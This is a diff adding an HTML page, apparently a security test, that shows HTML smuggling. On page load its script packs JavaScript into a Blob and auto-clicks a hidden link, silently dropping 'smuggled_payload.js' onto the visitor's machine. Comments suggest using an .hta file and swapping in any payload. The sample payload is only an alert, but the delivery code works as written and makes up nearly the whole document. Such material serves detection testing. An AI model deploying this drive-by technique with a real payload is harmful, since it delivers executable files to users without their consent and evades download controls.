@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HTML Smuggling - Suspicious Payload</title>
+</head>
+<body>
+  <h1>HTML Smuggling Simulation</h1>
+  <p>This test attempts to silently drop a `.js` file via HTML smuggling.</p>
+
+  <script>
+    // Replace this with any test payload you want
+    const maliciousPayload = `
+      // Simulated malicious JavaScript
+      alert('This .js file was smuggled!');
+    `;
+
+    // Create a Blob with application/javascript MIME type
+    const blob = new Blob([maliciousPayload], { type: 'application/javascript' });
+
+    // Create Object URL
+    const url = URL.createObjectURL(blob);
+
+    // Create a hidden download link for .js (change to .hta if needed)
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = "smuggled_payload.js"; // or smuggled_payload.hta
+    document.body.appendChild(link);
+
+    // Auto-click to trigger download (drive-by style)
+    link.click();
+
+    // Clean up
+    URL.revokeObjectURL(url);
+    document.body.removeChild(link);
+  </script>
+</body>
+</html>
